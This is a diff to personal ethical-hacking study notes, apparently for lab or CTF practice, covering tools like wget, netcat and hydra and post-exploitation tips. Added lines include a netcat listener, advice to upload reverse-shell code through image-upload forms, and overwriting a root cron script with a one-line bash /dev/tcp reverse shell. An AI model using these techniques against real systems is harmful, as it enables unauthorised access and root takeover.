@@ -7,6 +7,10 @@ Five stage of EH
 	5. Covering Tracks
 
 TOOLS
+Other:
+wget:
+	- download a file from web
+	- ex: wget http://<ip>/<file>
 Infomation Gathering:
 - Google
 - Burpsuite
@@ -51,6 +55,7 @@ Gaining Access: Exploitation
 	- n option is numeric-only IP addresses, no DNS
 	- p option is for port 
 	- e option is for excute. ex: nc 4444 -e /bin/bash (this will give bash shell to the listener, the machine that use this option will give other the shell it doesn't matter if you are listener or connector)
+	- ex for listener: netcat -nvlp <port>
 - hydra:
 	-l is login or user name
 	-P password
@@ -105,7 +110,7 @@ Apache/1.3.20 (Unix)
 
 
 EXTRA
-reverse shell: is when target connect to us 
+reverse shell: is when target connect to us. to reverse shell make sure you machine is listen for connection.
 bind shell: is when we connect to target
 payload: is a code that we send to target machine to get access.
 	-none stage payload:
@@ -119,3 +124,9 @@ payload: is a code that we send to target machine to get access.
 	note: when we exploit if stage payload not working then switch nonestage payload
 credential stuffing: injecting breached credentials in hopes of account take over
 password spraying: injecting breached user name with one or two password.
+
+NOTE
+- when reverse shell make sure your machine is listen to the connection. no need to this your self when using metasploit.
+- try to send melicious code to target webserver like reverse shell code if there something like 'upload image' etc in the web.
+if you get a shell but don't have much auth and you want to scan machine to see machine details and files and folder you can use 'linpeas.sh' by downloads it from github then host a web server in order to install it on target machine using tools like wget.
+- in some case target have a script file that automate stuff automatically and that file have a permission that user don't so we can take advantage of that scipt by changing the content of the script into a reverse shell script like 'bash -i >& /dev/tcp/10.0.2.4/8081 0>&1' this is a one line reverse shell script that give out root and also you can check if that file is automate or not in crontab 'crontab -l', 'crontab -u root -l'or systemctl 'systemctl list-timers' if you can't find it then try a tools like pspy by downlaod it from github
